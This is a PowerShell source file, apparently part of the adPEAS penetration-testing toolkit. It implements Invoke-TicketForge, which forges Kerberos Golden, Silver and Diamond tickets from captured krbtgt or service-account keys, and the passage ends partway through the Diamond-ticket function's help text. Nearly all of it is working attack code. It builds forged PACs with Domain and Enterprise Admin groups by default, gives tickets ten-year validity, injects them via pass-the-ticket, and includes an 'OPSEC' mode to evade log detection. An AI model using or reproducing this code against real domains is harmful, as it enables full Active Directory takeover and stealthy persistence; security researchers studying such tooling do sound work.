function Invoke-TicketForge {
<#
.SYNOPSIS
    Forges Kerberos tickets (Golden, Silver, Diamond) for security testing.

.DESCRIPTION
    Creates forged Kerberos tickets using captured keys from prior security assessments.
    This tool is intended for authorized penetration testing and security research.

    Supported Ticket Types:
    - Golden Ticket: Forged TGT using krbtgt key
    - Silver Ticket: Forged service ticket using service account key
    - Diamond Ticket: Modified legitimate TGT with custom PAC

    Each ticket type supports:
    - RC4-HMAC (etype 23) using NT-Hash
    - AES128-CTS (etype 17) using AES128 key
    - AES256-CTS (etype 18) using AES256 key

.PARAMETER Mode
    The type of ticket to forge:
    - Golden: Forged TGT using krbtgt key
    - Silver: Forged service ticket using service account key
    - Diamond: Modified legitimate TGT (requires existing TGT + krbtgt key)

.PARAMETER UserName
    The sAMAccountName of the user to impersonate.
    Default: "Administrator"

.PARAMETER Domain
    The domain name (FQDN format, e.g., "contoso.com").
    If not specified, uses the domain from the current adPEAS session (Connect-adPEAS).
    For Diamond tickets, extracted from the base TGT if not provided.

.PARAMETER Server
    Domain Controller for Kerberos operations (optional).
    Used for Diamond Ticket TGT requests when using -BaseUserCredential.

.PARAMETER DomainSID
    The domain SID string (e.g., "S-1-5-21-xxx-xxx-xxx").
    Required for Golden/Silver tickets unless an active adPEAS session exists.
    For Diamond tickets, extracted from the base TGT's PAC if not provided.

.PARAMETER UserRID
    The RID of the user being impersonated.
    For Golden/Silver: Default 500 (built-in Administrator).
    For Diamond: If not specified, uses the RID from the original TGT (OPSEC mode).

.PARAMETER NTHash
    The NT-Hash for ticket encryption (32 hex characters).
    - Golden/Diamond Ticket: krbtgt NT-Hash
    - Silver Ticket: Service account NT-Hash
    Uses RC4-HMAC encryption (etype 23).

.PARAMETER AES256Key
    The AES256 key for ticket encryption (64 hex characters).
    - Golden/Diamond Ticket: krbtgt AES256 key
    - Silver Ticket: Service account AES256 key
    Uses AES256-CTS-HMAC-SHA1-96 encryption (etype 18).

.PARAMETER AES128Key
    The AES128 key for ticket encryption (32 hex characters).
    - Golden/Diamond Ticket: krbtgt AES128 key
    - Silver Ticket: Service account AES128 key
    Uses AES128-CTS-HMAC-SHA1-96 encryption (etype 17).

.PARAMETER GroupRIDs
    Array of group RIDs to include in the PAC's GroupIds field.
    Default: @(512, 513, 518, 519, 520) — Domain Admins, Domain Users,
    Schema Admins, Enterprise Admins, Group Policy Creator Owners.
    IMPORTANT: Specifying this parameter REPLACES the entire default list.
    If you want to keep the default privileged groups AND add custom ones,
    you must include them explicitly (e.g., @(512, 513, 518, 519, 520, 1337)).

.PARAMETER ExtraSIDs
    Array of additional full SIDs to include in the PAC's ExtraSids field.
    Used for cross-domain trust abuse or special group membership.
    Default: empty array. Specifying this parameter REPLACES the default (empty) list.
    Example: @("S-1-18-1") for Authentication Authority Asserted Identity.
    Example: @("S-1-5-21-<TrustedDomainSID>-519") for cross-forest Enterprise Admins.

.PARAMETER ServicePrincipalName
    For Silver Tickets: The SPN of the target service (e.g., "cifs/server.domain.com").

.PARAMETER ServiceType
    For Silver Tickets: Shortcut for common service types.
    Options: CIFS, HTTP, LDAP, HOST, MSSQL, WSMAN

.PARAMETER TargetComputer
    For Silver Tickets: The target computer name (used with -ServiceType).

.PARAMETER ValidityDays
    Number of days the ticket should be valid.
    Default: 3650 (10 years) for Golden/Silver.
    Note: Diamond Tickets preserve the original TGT timestamps and ignore this parameter.

.PARAMETER OutputKirbi
    Path to save the forged ticket as a .kirbi file.

.PARAMETER PTT
    Immediately imports the forged ticket into the current Windows session.
    Equivalent to running Import-KerberosTicket after ticket creation.

.PARAMETER BaseUserTGT
    For Diamond Tickets: Base64-encoded legitimate TGT to modify.

.PARAMETER BaseUserTGTPath
    For Diamond Tickets: Path to .kirbi file containing legitimate TGT.

.PARAMETER BaseUserCredential
    For Diamond Tickets: PSCredential of the user whose TGT to request and modify.
    This allows realtime TGT acquisition from the domain.

.PARAMETER BaseUserName
    For Diamond Tickets: sAMAccountName of the base user when using -BaseUserNTHash or -BaseUserAES256Key.
    Required when using hash/key-based authentication (the hash/key belongs to this user).
    Not needed with -BaseUserCredential (extracted from credential) or -BaseUserTGT/-BaseUserTGTPath (extracted from ticket).

.PARAMETER BaseUserNTHash
    For Diamond Tickets: NT-Hash of the base user for Overpass-the-Hash TGT request.
    Requires -BaseUserName to specify which user the hash belongs to.

.PARAMETER BaseUserAES256Key
    For Diamond Tickets: AES256 key of the base user for Pass-the-Key TGT request.
    Requires -BaseUserName to specify which user the key belongs to.

.EXAMPLE
    # Golden Ticket with active adPEAS session (DomainSID from session)
    # Uses defaults: UserName=Administrator, Domain/DomainSID from session
    Connect-adPEAS -Domain "contoso.com" -Credential (Get-Credential)
    Invoke-TicketForge -Mode Golden -AES256Key "52a4126c7ab14fe..." -PTT

.EXAMPLE
    # Golden Ticket with explicit DomainSID (no session required)
    Invoke-TicketForge -Mode Golden -Domain "contoso.com" `
        -DomainSID "S-1-5-21-1234567890-1234567890-1234567890" `
        -AES256Key "52a4126c7ab14fe..." -PTT

.EXAMPLE
    # Golden Ticket with NT-Hash and custom user
    Invoke-TicketForge -Mode Golden -UserName "svc_backup" -Domain "contoso.com" `
        -DomainSID "S-1-5-21-1234567890-1234567890-1234567890" `
        -NTHash "32ED87BDB5FDC5E9CBA88547376818D4" `
        -OutputKirbi "golden.kirbi"

.EXAMPLE
    # Silver Ticket for CIFS service
    Invoke-TicketForge -Mode Silver -UserName "administrator" -Domain "contoso.com" `
        -DomainSID "S-1-5-21-xxx" -ServiceType CIFS -TargetComputer "fileserver" `
        -NTHash "ABC123..." -OutputKirbi "silver_cifs.kirbi"

.EXAMPLE
    # Silver Ticket with explicit SPN
    Invoke-TicketForge -Mode Silver -UserName "admin" -Domain "contoso.com" `
        -DomainSID "S-1-5-21-xxx" -ServicePrincipalName "MSSQLSvc/sql01.contoso.com:1433" `
        -AES256Key "..." -OutputKirbi "silver_sql.kirbi"

.EXAMPLE
    # Diamond Ticket with realtime TGT acquisition (using password)
    Invoke-TicketForge -Mode Diamond -Domain "contoso.com" `
        -BaseUserCredential (Get-Credential "lowpriv") `
        -AES256Key "KRBTGT_AES256KEY" `
        -GroupRIDs @(512, 519) -OutputKirbi "diamond.kirbi"

.EXAMPLE
    # Diamond Ticket with .kirbi file
    Invoke-TicketForge -Mode Diamond -BaseUserTGTPath ".\user_tgt.kirbi" `
        -AES256Key "KRBTGT_AES256KEY" -GroupRIDs @(512) -PTT

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [ValidateSet('Golden', 'Silver', 'Diamond')]
        [string]$Mode,

        [Parameter(Mandatory = $false)]
        [string]$UserName = "Administrator",

        [Parameter(Mandatory = $false)]
        [string]$Domain,

        [Parameter(Mandatory = $false)]
        [string]$Server,

        [Parameter(Mandatory = $false)]
        [ValidatePattern('^S-1-5-21-\d+-\d+-\d+$')]
        [string]$DomainSID,

        [Parameter(Mandatory = $false)]
        [uint32]$UserRID,

        [Parameter(Mandatory = $false)]
        [ValidatePattern('^[0-9a-fA-F]{32}$')]
        [string]$NTHash,

        [Parameter(Mandatory = $false)]
        [ValidatePattern('^[0-9a-fA-F]{64}$')]
        [string]$AES256Key,

        [Parameter(Mandatory = $false)]
        [ValidatePattern('^[0-9a-fA-F]{32}$')]
        [string]$AES128Key,

        [Parameter(Mandatory = $false)]
        [uint32[]]$GroupRIDs = @(512, 513, 518, 519, 520),

        [Parameter(Mandatory = $false)]
        [ValidateScript({ $_ | ForEach-Object { $_ -match '^S-1-' } | Where-Object { -not $_ } | ForEach-Object { throw "Invalid SID format" }; $true })]
        [string[]]$ExtraSIDs = @(),

        # Silver Ticket specific
        [Parameter(Mandatory = $false)]
        [string]$ServicePrincipalName,

        [Parameter(Mandatory = $false)]
        [ValidateSet('CIFS', 'HTTP', 'LDAP', 'HOST', 'MSSQL', 'WSMAN')]
        [string]$ServiceType,

        [Parameter(Mandatory = $false)]
        [string]$TargetComputer,

        [Parameter(Mandatory = $false)]
        [int]$ValidityDays,

        [Parameter(Mandatory = $false)]
        [string]$OutputKirbi,

        [Parameter(Mandatory = $false)]
        [switch]$PTT,

        # Diamond Ticket specific - existing TGT sources
        [Parameter(Mandatory = $false)]
        [string]$BaseUserTGT,

        [Parameter(Mandatory = $false)]
        [string]$BaseUserTGTPath,

        # Diamond Ticket specific - realtime TGT acquisition
        [Parameter(Mandatory = $false)]
        [System.Management.Automation.PSCredential]$BaseUserCredential,

        [Parameter(Mandatory = $false)]
        [string]$BaseUserName,

        [Parameter(Mandatory = $false)]
        [ValidatePattern('^[0-9a-fA-F]{32}$')]
        [string]$BaseUserNTHash,

        [Parameter(Mandatory = $false)]
        [ValidatePattern('^[0-9a-fA-F]{64}$')]
        [string]$BaseUserAES256Key
    )

    try {
        # Validate key is provided
        if (-not $NTHash -and -not $AES256Key -and -not $AES128Key) {
            throw "You must provide one of: -NTHash, -AES256Key, or -AES128Key"
        }

        # Validate BaseUserName is provided when using hash/key-based authentication
        if (($BaseUserNTHash -or $BaseUserAES256Key) -and -not $BaseUserName) {
            throw "When using -BaseUserNTHash or -BaseUserAES256Key, you must also provide -BaseUserName to specify which user the hash/key belongs to."
        }

        # Auto-detect Domain from existing adPEAS session if not provided
        # Diamond Tickets with file/base64 TGT can extract Domain from the ticket itself
        $diamondWithExistingTGT = ($Mode -eq 'Diamond' -and ($BaseUserTGTPath -or $BaseUserTGT))
        if (-not $Domain) {
            if ($Script:LDAPContext -and $Script:LDAPContext.Domain) {
                $Domain = $Script:LDAPContext.Domain
                Write-Log "[Invoke-TicketForge] Using domain from active session: $Domain"
            }
            elseif ($diamondWithExistingTGT) {
                Write-Log "[Invoke-TicketForge] Diamond Ticket: Domain will be extracted from base TGT"
            }
            else {
                throw "No -Domain specified and no active adPEAS session found. Use Connect-adPEAS first or provide -Domain explicitly."
            }
        }

        # Auto-detect Server from existing session if not provided
        if (-not $Server -and $Script:LDAPContext -and $Script:LDAPContext.Server) {
            $Server = $Script:LDAPContext.Server
            Write-Log "[Invoke-TicketForge] Using server from active session: $Server"
        }

        Write-Log "[Invoke-TicketForge] Starting $Mode Ticket creation for $UserName@$Domain"

        # Determine encryption type and key
        $encryptionType = 0
        $key = $null

        if ($AES256Key) {
            $encryptionType = 18  # AES256-CTS-HMAC-SHA1-96
            $key = ConvertFrom-HexStringToBytes -HexString $AES256Key
            Write-Log "[Invoke-TicketForge] Using AES256-CTS (etype 18)"
        }
        elseif ($AES128Key) {
            $encryptionType = 17  # AES128-CTS-HMAC-SHA1-96
            $key = ConvertFrom-HexStringToBytes -HexString $AES128Key
            Write-Log "[Invoke-TicketForge] Using AES128-CTS (etype 17)"
        }
        elseif ($NTHash) {
            $encryptionType = 23  # RC4-HMAC
            $key = ConvertFrom-HexStringToBytes -HexString $NTHash
            Write-Log "[Invoke-TicketForge] Using RC4-HMAC (etype 23)"
        }

        # Resolve DomainSID if not provided
        # Priority: 1) Explicit parameter, 2) Active adPEAS session, 3) Error for Golden/Silver
        # Diamond Tickets can extract DomainSID from the base TGT's PAC
        if (-not $DomainSID -and $Mode -ne 'Diamond') {
            # Try to get DomainSID from active adPEAS session
            if ($Script:LDAPContext -and $Script:LDAPContext.DomainSID) {
                $DomainSID = $Script:LDAPContext.DomainSID
                Write-Log "[Invoke-TicketForge] Using DomainSID from active adPEAS session: $DomainSID"
            }
            else {
                throw "DomainSID is required for $Mode Tickets. Either provide -DomainSID parameter or establish an adPEAS session first with Connect-adPEAS."
            }
        }
        elseif (-not $DomainSID -and $Mode -eq 'Diamond') {
            Write-Log "[Invoke-TicketForge] Diamond Ticket: DomainSID will be extracted from base TGT's PAC"
        }

        # Set ValidityDays default for Golden/Silver (Diamond uses original TGT timestamps)
        if (-not $ValidityDays -and $Mode -ne 'Diamond') {
            $ValidityDays = 3650
        }

        # Set default kvno values - no LDAP lookup needed
        # Set internal kvno values (not user-configurable)
        # Note: KDC does NOT validate kvno, it only uses it for key selection during decryption
        $kvno = switch ($Mode) {
            'Golden' { 2 }   # Default krbtgt kvno
            'Silver' { 1 }   # Default service account kvno
            'Diamond' { 0 }  # Will be extracted from base TGT
        }

        # For Golden/Silver: Default UserRID to 500 if not specified
        $effectiveUserRID = if ($PSBoundParameters.ContainsKey('UserRID')) { $UserRID } else { 500 }

        # Dispatch to appropriate handler
        $result = switch ($Mode) {
            'Golden' {
                New-GoldenTicket -UserName $UserName -Domain $Domain -DomainSID $DomainSID `
                    -UserRID $effectiveUserRID -Key $key -EncryptionType $encryptionType `
                    -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
                    -ValidityDays $ValidityDays `
                    -Kvno $kvno -OutputKirbi $OutputKirbi
            }
            'Silver' {
                # Build SPN if not explicit
                $spn = $ServicePrincipalName
                if (-not $spn -and $ServiceType -and $TargetComputer) {
                    $targetFQDN = if ($TargetComputer -like "*.*") { $TargetComputer } else { "$TargetComputer.$Domain" }
                    $spn = switch ($ServiceType) {
                        'CIFS' { "cifs/$targetFQDN" }
                        'HTTP' { "http/$targetFQDN" }
                        'LDAP' { "ldap/$targetFQDN" }
                        'HOST' { "host/$targetFQDN" }
                        'MSSQL' { "MSSQLSvc/$targetFQDN" }
                        'WSMAN' { "wsman/$targetFQDN" }
                    }
                }

                if (-not $spn) {
                    throw "Silver Ticket requires -ServicePrincipalName or both -ServiceType and -TargetComputer"
                }

                New-SilverTicket -UserName $UserName -Domain $Domain -DomainSID $DomainSID `
                    -UserRID $effectiveUserRID -Key $key -EncryptionType $encryptionType `
                    -ServicePrincipalName $spn -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
                    -ValidityDays $ValidityDays `
                    -Kvno $kvno -OutputKirbi $OutputKirbi
            }
            'Diamond' {
                # Diamond Ticket requires a base TGT - either from file/base64 or realtime acquisition
                $baseTgtBytes = $null
                $tgtResult = $null

                # Option 1: Load from file
                if ($BaseUserTGTPath) {
                    if (-not (Test-Path $BaseUserTGTPath)) {
                        throw "Base TGT file not found: $BaseUserTGTPath"
                    }
                    $baseTgtBytes = [System.IO.File]::ReadAllBytes($BaseUserTGTPath)
                    Write-Log "[Invoke-TicketForge] Loaded base TGT from file: $BaseUserTGTPath"
                }
                # Option 2: Base64 string
                elseif ($BaseUserTGT) {
                    $baseTgtBytes = [Convert]::FromBase64String($BaseUserTGT)
                    Write-Log "[Invoke-TicketForge] Loaded base TGT from Base64 string"
                }
                # Options 3-5: Realtime TGT acquisition via Kerberos
                elseif ($BaseUserCredential -or $BaseUserNTHash -or $BaseUserAES256Key) {
                    # Determine username and auth params for Invoke-KerberosAuth
                    $authParams = @{
                        Domain = $Domain
                        DomainController = $Server
                    }

                    if ($BaseUserCredential) {
                        $resolvedBaseUserName = $BaseUserCredential.UserName
                        if ($resolvedBaseUserName -match '\\') { $resolvedBaseUserName = $resolvedBaseUserName.Split('\')[1] }
                        if ($resolvedBaseUserName -match '@') { $resolvedBaseUserName = $resolvedBaseUserName.Split('@')[0] }
                        $authParams.UserName = $resolvedBaseUserName
                        $authParams.Credential = $BaseUserCredential
                        $authMethod = "Credential"
                    }
                    elseif ($BaseUserNTHash) {
                        $authParams.UserName = $BaseUserName
                        $authParams.NTHash = $BaseUserNTHash
                        $authMethod = "Overpass-the-Hash"
                    }
                    else {
                        $authParams.UserName = $BaseUserName
                        $authParams.AES256Key = $BaseUserAES256Key
                        $authMethod = "Pass-the-Key (AES256)"
                    }

                    Write-Log "[Invoke-TicketForge] Requesting realtime TGT via $authMethod for $($authParams.UserName)..."
                    $tgtResult = Invoke-KerberosAuth @authParams

                    if (-not $tgtResult -or -not $tgtResult.Success) {
                        throw "Failed to acquire TGT via ${authMethod}: $($tgtResult.Error)"
                    }

                    # Build KRB-CRED from raw ticket bytes
                    $baseTgtBytes = Build-KRBCred -Ticket $tgtResult.TicketBytes `
                        -SessionKey $tgtResult.SessionKeyBytes `
                        -SessionKeyType $tgtResult.EncryptionType `
                        -Realm $Domain.ToUpper() `
                        -ClientName $authParams.UserName `
                        -AuthTime $tgtResult.AuthTime `
                        -StartTime $tgtResult.StartTime `
                        -EndTime $tgtResult.EndTime `
                        -RenewTill $tgtResult.RenewTill
                    Write-Log "[Invoke-TicketForge] Acquired TGT for $($authParams.UserName) via $authMethod (etype $($tgtResult.EncryptionType))"
                }
                else {
                    throw "Diamond Ticket requires one of: -BaseUserTGT, -BaseUserTGTPath, -BaseUserCredential, or -BaseUserName with -BaseUserNTHash/-BaseUserAES256Key"
                }

                # OPSEC Decision: For Diamond Tickets, preserve original TGT user by default.
                # Only impersonate if -UserName was EXPLICITLY provided by the user.
                $impersonateUser = $PSBoundParameters.ContainsKey('UserName')

                if ($impersonateUser) {
                    Write-Log "[Invoke-TicketForge] Diamond Ticket: Impersonating $UserName (RID $effectiveUserRID)"
                    New-DiamondTicket -UserName $UserName -Domain $Domain -DomainSID $DomainSID `
                        -UserRID $effectiveUserRID -Key $key -EncryptionType $encryptionType `
                        -BaseUserTGT $baseTgtBytes -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
                        -Kvno $kvno -OutputKirbi $OutputKirbi
                } else {
                    # No explicit -UserName, preserve original TGT user (OPSEC default)
                    # Pass $null for UserName and UserRID=0 to let New-DiamondTicket extract from TGT
                    Write-Log "[Invoke-TicketForge] Diamond Ticket: Preserving original TGT user (OPSEC mode)"
                    New-DiamondTicket -Domain $Domain -DomainSID $DomainSID `
                        -Key $key -EncryptionType $encryptionType `
                        -BaseUserTGT $baseTgtBytes -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
                        -Kvno $kvno -OutputKirbi $OutputKirbi
                }
            }
        }

        # Pass-the-Ticket: Import the forged ticket into current session
        # Use the pre-built KRB-CRED (KirbiBytes) which was created by Build-KRBCred
        # with all correct metadata already embedded. This avoids any potential
        # issues from rebuilding the KRB-CRED in Import-KerberosTicket.
        if ($PTT -and $result -and $result.Success -and $result.KirbiBytes) {
            Write-Log "[Invoke-TicketForge] Importing ticket into current session (Pass-the-Ticket)..."
            Write-Log "[Invoke-TicketForge] Using pre-built KRB-CRED ($($result.KirbiBytes.Length) bytes)"

            # Import using pre-built KRB-CRED directly (already has all metadata embedded)
            $pttResult = Import-KerberosTicket -TicketBytes $result.KirbiBytes

            if ($pttResult -and $pttResult.Success) {
                Write-Log "[Invoke-TicketForge] Ticket imported successfully"
                $result | Add-Member -NotePropertyName 'PassTheTicket' -NotePropertyValue $true -Force
                $result | Add-Member -NotePropertyName 'PTTResult' -NotePropertyValue $pttResult -Force
                $result.Message = "$($result.Message) - Ticket imported into session"
            }
            else {
                Write-Log "[Invoke-TicketForge] Failed to import ticket: $($pttResult.Error)" -Level Warning
                $result | Add-Member -NotePropertyName 'PassTheTicket' -NotePropertyValue $false -Force
                $result | Add-Member -NotePropertyName 'PTTError' -NotePropertyValue $pttResult.Error -Force
                $result.Message = "$($result.Message) - PTT failed: $($pttResult.Error)"
            }
        }

        return $result
    }
    catch {
        Write-Log "[Invoke-TicketForge] Error: $_" -Level Error
        return [PSCustomObject]@{
            Success = $false
            Mode = $Mode
            UserName = $UserName
            Domain = $Domain
            Error = $_.Exception.Message
            Message = "$Mode Ticket creation failed: $($_.Exception.Message)"
        }
    }
}

#region Helper: Hex to Byte Array Conversion

function ConvertFrom-HexStringToBytes {
    <#
    .SYNOPSIS
        Converts a hexadecimal string to a byte array.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$HexString
    )

    $length = $HexString.Length / 2
    $bytes = [byte[]]::new($length)
    for ($i = 0; $i -lt $length; $i++) {
        $bytes[$i] = [Convert]::ToByte($HexString.Substring($i * 2, 2), 16)
    }
    return $bytes
}

#endregion

#region Golden Ticket Implementation

function New-GoldenTicket {
    [CmdletBinding()]
    param(
        [string]$UserName,
        [string]$Domain,
        [string]$DomainSID,
        [uint32]$UserRID,
        [byte[]]$Key,
        [int]$EncryptionType,
        [uint32[]]$GroupRIDs,
        [string[]]$ExtraSIDs,
        [int]$ValidityDays,
        [int]$Kvno,
        [string]$OutputKirbi
    )

    Write-Log "[New-GoldenTicket] Building Golden Ticket..."

    # Generate random session key with proper resource disposal
    $sessionKeyLength = if ($EncryptionType -eq 18) { 32 } else { 16 }
    $sessionKey = [byte[]]::new($sessionKeyLength)
    $rng = $null
    try {
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $rng.GetBytes($sessionKey)
    } finally {
        if ($rng) { $rng.Dispose() }
    }

    # Calculate times (RenewTill = EndTime for simplicity, matches Rubeus behavior)
    $now = [datetime]::UtcNow
    $authTime = $now
    $startTime = $now
    $endTime = $now.AddDays($ValidityDays)
    $renewTill = $endTime

    # Parse domain info
    # Realm and client realm = UPPERCASE
    # SPN service instance (krbtgt/domain) = lowercase (Rubeus compatibility)
    $domainNetBIOS = $Domain.Split('.')[0].ToUpper()
    $domainFQDN = $Domain.ToUpper()
    $domainLower = $Domain.ToLower()

    Write-Log "[New-GoldenTicket] Domain: $domainFQDN, SID: $DomainSID"
    Write-Log "[New-GoldenTicket] User: $UserName (RID: $UserRID), Groups: $($GroupRIDs -join ', ')"

    # Build PAC
    Write-Log "[New-GoldenTicket] Building PAC..."
    # AuthTime is used for CLIENT_INFO.ClientId and MUST match EncTicketPart.authtime
    $pacResult = Build-PAC -UserName $UserName -Domain $domainNetBIOS `
        -DnsDomainName $Domain -DomainSID $DomainSID -UserRID $UserRID `
        -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
        -EncryptionType $EncryptionType -LogonTime $authTime -AuthTime $authTime

    $pacData = Complete-PACSignatures -PACData $pacResult.PACData `
        -ServerChecksumOffset $pacResult.ServerChecksumOffset `
        -KDCChecksumOffset $pacResult.KDCChecksumOffset `
        -Key $Key -EncryptionType $EncryptionType

    Write-Log "[New-GoldenTicket] PAC: $($pacData.Length) bytes"

    # Build EncTicketPart
    $ticketFlags = New-TicketFlags -Forwardable -Renewable -Initial -PreAuthent

    $encTicketPart = New-EncTicketPart -SessionKey $sessionKey -SessionKeyType $EncryptionType `
        -ClientRealm $domainFQDN -ClientName $UserName `
        -AuthTime $authTime -StartTime $startTime -EndTime $endTime -RenewTill $renewTill `
        -PACData $pacData -TicketFlags $ticketFlags

    # Encrypt EncTicketPart using Windows native crypto (same as Rubeus)
    $keyUsage = 2
    $encryptedTicketPart = Protect-KerberosNative -Key $Key -Data $encTicketPart `
        -KeyUsage $keyUsage -EncryptionType $EncryptionType

    # Build Ticket
    # Note: ServerInstance should be lowercase like Rubeus (krbtgt/contoso.com not krbtgt/CONTOSO.COM)
    $ticket = New-KerberosTicket -Realm $domainFQDN -ServerName "krbtgt" `
        -ServerInstance $domainLower -EncryptedPart $encryptedTicketPart `
        -EncryptionType $EncryptionType -Kvno $kvno

    # Build KRB-CRED
    $krbCred = Build-KRBCred -Ticket $ticket -SessionKey $sessionKey `
        -SessionKeyType $EncryptionType -Realm $domainFQDN -ClientName $UserName `
        -ServerName "krbtgt" -ServerInstance $domainLower `
        -AuthTime $authTime -StartTime $startTime -EndTime $endTime -RenewTill $renewTill `
        -TicketFlags $ticketFlags

    # Save if requested
    $outputPath = $null
    if ($OutputKirbi) {
        $outputPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($OutputKirbi)
        [System.IO.File]::WriteAllBytes($outputPath, $krbCred)
        Write-Log "[New-GoldenTicket] Saved to: $outputPath"
    }

    return [PSCustomObject]@{
        Success = $true
        Mode = 'Golden'
        UserName = $UserName
        Domain = $domainFQDN
        DomainSID = $DomainSID
        UserRID = $UserRID
        GroupRIDs = $GroupRIDs
        ExtraSIDs = $ExtraSIDs
        EncryptionType = $EncryptionType
        EncryptionTypeName = switch ($EncryptionType) { 17 { "AES128-CTS" } 18 { "AES256-CTS" } 23 { "RC4-HMAC" } }
        Kvno = $Kvno
        AuthTime = $authTime
        StartTime = $startTime
        EndTime = $endTime
        RenewTill = $renewTill
        TicketBytes = $ticket
        KirbiBytes = $krbCred
        SessionKey = $sessionKey
        SessionKeyBase64 = [Convert]::ToBase64String($sessionKey)
        KirbiBase64 = [Convert]::ToBase64String($krbCred)
        OutputPath = $outputPath
        Message = "Golden Ticket created successfully"
    }
}

#endregion

#region Silver Ticket Implementation

function New-SilverTicket {
    [CmdletBinding()]
    param(
        [string]$UserName,
        [string]$Domain,
        [string]$DomainSID,
        [uint32]$UserRID,
        [byte[]]$Key,
        [int]$EncryptionType,
        [string]$ServicePrincipalName,
        [uint32[]]$GroupRIDs,
        [string[]]$ExtraSIDs,
        [int]$ValidityDays,
        [int]$Kvno,
        [string]$OutputKirbi
    )

    Write-Log "[New-SilverTicket] Building Silver Ticket for $ServicePrincipalName..."

    # Parse SPN
    $spnParts = $ServicePrincipalName -split '/'
    if ($spnParts.Count -lt 2) {
        throw "Invalid SPN format. Expected: service/host or service/host:port"
    }
    $serviceName = $spnParts[0]
    $serviceHost = $spnParts[1]  # Keep port if present (e.g., "sql01.contoso.com:1433")

    # Generate random session key with proper resource disposal
    $sessionKeyLength = if ($EncryptionType -eq 18) { 32 } else { 16 }
    $sessionKey = [byte[]]::new($sessionKeyLength)
    $rng = $null
    try {
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $rng.GetBytes($sessionKey)
    } finally {
        if ($rng) { $rng.Dispose() }
    }

    # Calculate times (RenewTill = EndTime for simplicity, matches Rubeus behavior)
    $now = [datetime]::UtcNow
    $authTime = $now
    $startTime = $now
    $endTime = $now.AddDays($ValidityDays)
    $renewTill = $endTime

    # Parse domain info
    $domainNetBIOS = $Domain.Split('.')[0].ToUpper()
    $domainFQDN = $Domain.ToUpper()

    Write-Log "[New-SilverTicket] Service: $serviceName, Host: $serviceHost"

    # Build PAC (required by modern DCs due to CVE-2021-42287 enforcement)
    # AuthTime is used for CLIENT_INFO.ClientId and MUST match EncTicketPart.authtime
    $pacResult = Build-PAC -UserName $UserName -Domain $domainNetBIOS `
        -DnsDomainName $Domain -DomainSID $DomainSID -UserRID $UserRID `
        -GroupRIDs $GroupRIDs -ExtraSIDs $ExtraSIDs `
        -EncryptionType $EncryptionType -LogonTime $authTime -AuthTime $authTime

    $pacData = Complete-PACSignatures -PACData $pacResult.PACData `
        -ServerChecksumOffset $pacResult.ServerChecksumOffset `
        -KDCChecksumOffset $pacResult.KDCChecksumOffset `
        -Key $Key -EncryptionType $EncryptionType

    # Build EncTicketPart (no Initial flag for service tickets)
    $ticketFlags = New-TicketFlags -Forwardable -Renewable -PreAuthent

    $encTicketPart = New-EncTicketPart -SessionKey $sessionKey -SessionKeyType $EncryptionType `
        -ClientRealm $domainFQDN -ClientName $UserName `
        -AuthTime $authTime -StartTime $startTime -EndTime $endTime -RenewTill $renewTill `
        -PACData $pacData -TicketFlags $ticketFlags

    # Encrypt EncTicketPart using Windows native crypto (same as Rubeus)
    $keyUsage = 2
    $encryptedTicketPart = Protect-KerberosNative -Key $Key -Data $encTicketPart `
        -KeyUsage $keyUsage -EncryptionType $EncryptionType

    # Build Ticket with service principal
    $ticket = New-KerberosTicket -Realm $domainFQDN -ServerName $serviceName `
        -ServerInstance $serviceHost -EncryptedPart $encryptedTicketPart `
        -EncryptionType $EncryptionType -Kvno $kvno

    # Build KRB-CRED
    $krbCred = Build-KRBCred -Ticket $ticket -SessionKey $sessionKey `
        -SessionKeyType $EncryptionType -Realm $domainFQDN -ClientName $UserName `
        -ServerName $serviceName -ServerInstance $serviceHost `
        -AuthTime $authTime -StartTime $startTime -EndTime $endTime -RenewTill $renewTill `
        -TicketFlags $ticketFlags

    # Save if requested
    $outputPath = $null
    if ($OutputKirbi) {
        $outputPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($OutputKirbi)
        [System.IO.File]::WriteAllBytes($outputPath, $krbCred)
        Write-Log "[New-SilverTicket] Saved to: $outputPath"
    }

    return [PSCustomObject]@{
        Success = $true
        Mode = 'Silver'
        UserName = $UserName
        Domain = $domainFQDN
        DomainSID = $DomainSID
        UserRID = $UserRID
        ServicePrincipalName = $ServicePrincipalName
        GroupRIDs = $GroupRIDs
        ExtraSIDs = $ExtraSIDs
        EncryptionType = $EncryptionType
        EncryptionTypeName = switch ($EncryptionType) { 17 { "AES128-CTS" } 18 { "AES256-CTS" } 23 { "RC4-HMAC" } }
        Kvno = $Kvno
        AuthTime = $authTime
        StartTime = $startTime
        EndTime = $endTime
        RenewTill = $renewTill
        TicketBytes = $ticket
        KirbiBytes = $krbCred
        SessionKey = $sessionKey
        SessionKeyBase64 = [Convert]::ToBase64String($sessionKey)
        KirbiBase64 = [Convert]::ToBase64String($krbCred)
        OutputPath = $outputPath
        Message = "Silver Ticket created successfully for $ServicePrincipalName"
    }
}

#endregion

#region Diamond Ticket Implementation

function New-DiamondTicket {
    <#
    .SYNOPSIS
        Creates a Diamond Ticket by acquiring a real TGT and rebuilding it with elevated privileges.

    .DESCRIPTION
        Diamond Ticket "Hybrid" Approach:
        1. Decrypts the provided TGT to extract: UserName, Domain, DomainSID, timestamps, session key
        2. Rebuilds the ticket completely using the proven Golden Ticket implementation
        3. Uses the requested groups (e.g., Domain Admins 512) in the new PAC
        4. Preserves the original session key so TGS-REQ works

        OPSEC Behavior:
        - If -UserName is NOT provided: Keeps the original TGT user (stealthier - matches AS-REQ logs)
        - If -UserName IS provided: Impersonates that user (useful for specific scenarios)

        OPSEC Value: A legitimate AS-REQ was issued to obtain the base TGT.
        The final ticket uses our stable Golden Ticket PAC building.

        This approach avoids complex NDR in-place patching which is fragile across
        different AD environments.

    .PARAMETER UserName
        Optional. The user to impersonate in the forged ticket.
        If not specified, preserves the original TGT user (OPSEC default).
